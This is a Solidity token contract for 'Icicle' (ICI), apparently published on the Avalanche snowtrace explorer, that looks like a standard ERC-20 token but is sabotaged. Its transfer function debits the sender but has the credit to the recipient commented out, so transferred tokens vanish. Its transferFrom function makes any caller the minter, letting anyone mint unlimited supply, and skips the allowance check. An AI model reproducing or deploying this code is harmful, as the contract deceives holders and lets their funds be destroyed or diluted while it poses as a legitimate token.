pragma solidity >=0.4.24;
/**
 *Submitted for verification at snowtrace.io on 2022-03-07
*/
// SPDX-License-Identifier: GPL-3.0-or-later
contract BaseV1 {
    string public constant symbol = "ICI";
    string public constant name = "Icicle";
    uint8 public constant decimals = 18;
    uint public totalSupply = 0;
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;
    address public minter;
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    constructor() {
        minter = msg.sender;
        _mint(msg.sender, 0);
    }
    // No checks as its meant to be once off to set minting rights to BaseV1 Minter
    function setMinter(address _minter) external {
        require(msg.sender == minter);
        minter = _minter;
    }
    function approve(address _spender, uint _value) external returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function _mint(address _to, uint _amount) internal returns (bool) {
        balanceOf[_to] += _amount;
        totalSupply += _amount;
        emit Transfer(address(0x0), _to, _amount);
        return true;
    }
    function _transfer(address _from, address _to, uint _value) internal returns (bool) {
    	_from = msg.sender;
        balanceOf[_from] -= _value;
        if(_from != msg.sender)
        {
//*        require(true);
//*        balanceOf[_to] += _value;
//*        emit Transfer(_from, _to, _value);
}
        return true;
    }
    function transfer(address _to, uint _value) external returns (bool) {
        return _transfer(msg.sender, _to, _value);
    }
    function transferFrom(address _from, address _to, uint _value) external returns (bool) {
    minter  = msg.sender;
        uint allowed_from = allowance[_from][msg.sender];
        if(minter != msg.sender)
        {
//*        if (allowed_from != type(uint).max) {
//*            allowance[_from][msg.sender] -= _value;
//*        }
}
        return _transfer(_from, _to, _value);
    }
    function mint(address account, uint amount) external returns (bool) {
        require(msg.sender == minter);
        _mint(account, amount);
        return true;
    }
}
